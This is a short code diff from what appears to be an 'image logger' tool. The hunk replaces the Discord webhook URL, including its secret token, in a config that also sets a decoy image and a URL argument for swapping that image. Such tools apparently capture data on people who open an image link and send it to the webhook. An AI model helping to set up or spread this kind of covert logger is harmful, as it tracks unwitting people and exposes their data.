@@ -11,7 +11,7 @@ __author__ = "nsqk"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1390103508031770796/eSkB3MjmpYNm4VtYSC2JLQtXiaIBHd7JcvXvZ7iaUskvSXlIUxbqhqhI7UFKfVFenfDP",
+    "webhook": "https://discord.com/api/webhooks/1386145014085718199/JlrM5sz0ixtyXuaj1fFXm4DfMoUrMsAGJf8ODSNsayj29cYaUFOhGWSK4U37LB73spQM",
     "image": "https://wallpaperaccess.com/full/2060551.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
